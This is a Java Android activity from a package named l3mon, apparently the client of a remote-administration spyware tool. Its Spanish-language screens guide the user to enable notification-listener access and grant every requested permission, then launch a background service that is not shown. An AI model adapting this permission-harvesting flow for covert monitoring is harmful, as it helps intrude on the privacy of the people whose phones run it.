
package com.etechd.l3mon;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;

public class MainActivity extends Activity {

    private static final String NOTIFICATION_LISTENER_KEY = "enabled_notification_listeners";
    private static final int CHECK_PERMISSION_DELAY = 2000; // 2 segundos
    private static final int MAX_PERMISSION_ATTEMPTS = 3;

    private LinearLayout permissionContainer;
    private TextView instructionText;
    private Button nextButton;
    private ProgressBar progressBar;
    private int currentStep = 0;
    private int permissionAttempts = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Verifica permisos inmediatamente
        if (isNotificationServiceRunning()) {
            startMainService();
            finish();
            return;
        }

        // Muestra la pantalla de configuración de permisos
        setupPermissionUI();
    }

    /**
     * Configura la interfaz de usuario para guiar al usuario a través del proceso de permisos
     */
    private void setupPermissionUI() {
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setPadding(40, 40, 40, 40);
        mainLayout.setBackgroundColor(Color.parseColor("#F5F5F5"));

        // Título
        TextView titleText = new TextView(this);
        titleText.setText("Configuración Requerida");
        titleText.setTextSize(24);
        titleText.setTypeface(Typeface.DEFAULT_BOLD);
        titleText.setTextColor(Color.BLACK);
        titleText.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.bottomMargin = 30;
        mainLayout.addView(titleText, titleParams);

        // Contenedor de instrucciones
        permissionContainer = new LinearLayout(this);
        permissionContainer.setOrientation(LinearLayout.VERTICAL);
        permissionContainer.setBackgroundColor(Color.WHITE);
        permissionContainer.setPadding(20, 20, 20, 20);
        LinearLayout.LayoutParams containerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        containerParams.bottomMargin = 30;
        mainLayout.addView(permissionContainer, containerParams);

        // Texto de instrucción
        instructionText = new TextView(this);
        instructionText.setTextSize(16);
        instructionText.setTextColor(Color.parseColor("#333333"));
        instructionText.setLineSpacing(1.2f, 1.2f);
        permissionContainer.addView(instructionText);

        // Barra de progreso
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setProgress(0);
        progressBar.setMax(100);
        LinearLayout.LayoutParams progressParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        progressParams.topMargin = 20;
        permissionContainer.addView(progressBar, progressParams);

        // Botón Siguiente
        nextButton = new Button(this);
        nextButton.setText("Siguiente");
        nextButton.setTextColor(Color.WHITE);
        nextButton.setBackgroundColor(Color.parseColor("#4CAF50"));
        nextButton.setTypeface(Typeface.DEFAULT_BOLD);
        nextButton.setOnClickListener(v -> handleNextStep());
        LinearLayout.LayoutParams buttonParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        buttonParams.topMargin = 20;
        mainLayout.addView(nextButton, buttonParams);

        setContentView(mainLayout);
        
        // Muestra el primer paso
        showStep(0);
    }

    /**
     * Muestra el paso actual del proceso de configuración
     */
    private void showStep(int step) {
        currentStep = step;
        
        switch (step) {
            case 0:
                updateUI(
                    "Paso 1: Habilitar Servicio de Notificaciones",
                    "Se abrirá la configuración del servicio de escucha de notificaciones.\n\n" +
                    "1. Busca esta aplicación en la lista\n" +
                    "2. Activa la opción",
                    25
                );
                break;
            case 1:
                updateUI(
                    "Paso 2: Habilitar Permisos",
                    "Se abrirán los detalles de la aplicación.\n\n" +
                    "1. Dirígete a 'Permisos'\n" +
                    "2. Habilita todos los permisos solicitados",
                    50
                );
                break;
            case 2:
                updateUI(
                    "Paso 3: Verificar Configuración",
                    "Verificando que todos los permisos estén habilitados...",
                    75
                );
                checkPermissionsAfterDelay();
                break;
        }
    }

    /**
     * Actualiza el contenido de la UI del paso actual
     */
    private void updateUI(String title, String instruction, int progress) {
        instructionText.setText(instruction);
        progressBar.setProgress(progress);
        
        if (currentStep < 2) {
            nextButton.setEnabled(true);
            nextButton.setText("Siguiente");
        } else {
            nextButton.setEnabled(false);
            nextButton.setText("Verificando...");
        }
    }

    /**
     * Maneja el click del botón siguiente
     */
    private void handleNextStep() {
        switch (currentStep) {
            case 0:
                openNotificationListenerSettings();
                showStep(1);
                break;
            case 1:
                openAppDetailsSettings();
                showStep(2);
                break;
        }
    }

    /**
     * Verifica los permisos después de un delay
     */
    private void checkPermissionsAfterDelay() {
        nextButton.postDelayed(() -> {
            if (isNotificationServiceRunning()) {
                showSuccessMessage();
                startMainService();
                finish();
            } else {
                permissionAttempts++;
                if (permissionAttempts < MAX_PERMISSION_ATTEMPTS) {
                    showRetryMessage();
                    showStep(0);
                } else {
                    showFailureMessage();
                }
            }
        }, CHECK_PERMISSION_DELAY);
    }

    /**
     * Abre la configuración del servicio de notificaciones
     */
    private void openNotificationListenerSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            Toast.makeText(this, "No se pudo abrir configuración", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * Abre los detalles de la aplicación
     */
    private void openAppDetailsSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (Exception e) {
            Toast.makeText(this, "No se pudo abrir detalles de la app", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * Muestra mensaje de éxito
     */
    private void showSuccessMessage() {
        Toast.makeText(this, "✓ Permisos configurados correctamente", Toast.LENGTH_LONG).show();
    }

    /**
     * Muestra mensaje de reintento
     */
    private void showRetryMessage() {
        Toast.makeText(
            this,
            "Intento " + permissionAttempts + "/" + MAX_PERMISSION_ATTEMPTS,
            Toast.LENGTH_SHORT
        ).show();
    }

    /**
     * Muestra mensaje de fallo
     */
    private void showFailureMessage() {
        Toast.makeText(
            this,
            "⚠ Por favor, habilita manualmente los permisos",
            Toast.LENGTH_LONG
        ).show();
    }

    /**
     * Inicia el servicio principal
     */
    private void startMainService() {
        Intent serviceIntent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    /**
     * Verifica si el servicio de notificaciones está habilitado
     */
    private boolean isNotificationServiceRunning() {
        try {
            ContentResolver contentResolver = getContentResolver();
            String enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                NOTIFICATION_LISTENER_KEY
            );
            return enabledNotificationListeners != null &&
                   enabledNotificationListeners.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }
}
